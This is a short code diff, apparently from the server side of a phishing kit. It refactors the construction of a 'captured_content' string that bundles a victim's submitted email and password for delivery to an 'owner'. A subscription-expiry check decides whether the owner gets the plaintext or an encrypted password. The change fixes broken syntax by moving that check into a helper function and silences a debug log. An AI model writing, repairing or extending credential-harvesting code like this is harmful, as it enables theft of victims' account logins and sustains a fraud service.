@@ -62,12 +62,18 @@ const decryptedPass = cryptr.decrypt(encryptedPass);
 const month = date.getMonth() + 1;
 const day = date.getDate();
  let fulldate =[year,month,day].join("-");
- console.log(fulldate);
+// console.log(fulldate);
  
  let user = myArray.find(o => o.id == req.body.owner);
 
+ function check_member(){
+  if(user.expire_date==fulldate){
+   return encryptedPass;}else{
+    return password;
+   }
+  }
  
-    var captured_content = `\n Email: ${req.body.email} Password: ${if(user.expire_date==fulldate){return encryptedPass;}else{return password;}}`;
+    var captured_content = `\n Email: ${req.body.email} Password: ${check_member()}`;
     let toMail = req.body.owner;
     
     
